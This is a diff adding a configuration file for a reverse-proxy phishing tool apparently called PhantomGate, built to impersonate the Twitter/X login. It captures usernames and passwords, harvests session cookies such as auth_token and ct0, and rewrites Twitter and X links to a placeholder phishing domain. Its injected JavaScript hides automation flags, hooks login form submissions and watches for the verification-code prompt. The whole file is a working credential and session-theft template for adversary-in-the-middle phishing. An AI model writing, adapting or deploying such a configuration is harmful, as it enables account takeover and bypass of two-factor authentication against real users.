@@ -1,0 +1,89 @@
+name: Twitter / X
+author: PhantomGate
+version: 2.0.0
+description: Twitter / X authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - twitter.com
+    - x.com
+    - api.twitter.com
+  
+  login:
+    domain: twitter.com
+    path: /login
+    username:
+      selector: "input[autocomplete='username']"
+      capture: true
+    password:
+      selector: "input[name='password']"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: auth_token
+        regex: ".*"
+      - name: ct0
+        regex: ".*"
+      - name: guest_id
+        regex: ".*"
+      - name: guest_id_marketing
+        regex: ".*"
+      - name: guest_id_ads
+        regex: ".*"
+      - name: twid
+        regex: ".*"
+      - name: _twitter_sess
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: twitter.com
+      inject: true
+    - domain: x.com
+      inject: true
+  
+  sub_filters:
+    - domain: twitter.com
+      search: "https://twitter.com"
+      replace: "https://{phishing_domain}"
+    - domain: x.com
+      search: "https://x.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Twitter/X
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('input[autocomplete="username"]');
+        var password = form.querySelector('input[name="password"]');
+        if (username && password) {
+          console.log('[PhantomGate] Twitter credentials captured');
+        }
+      }, true);
+      
+      // Monitor for verification prompt
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.addedNodes.length) {
+            var node = mutation.addedNodes[0];
+            if (node.nodeType === 1) {
+              var otp = node.querySelector('input[name="challenge_response"]');
+              if (otp) {
+                console.log('[PhantomGate] Verification prompt detected');
+              }
+            }
+          }
+        });
+      });
+      
+      observer.observe(document.body, {childList: true, subtree: true});
+    })();
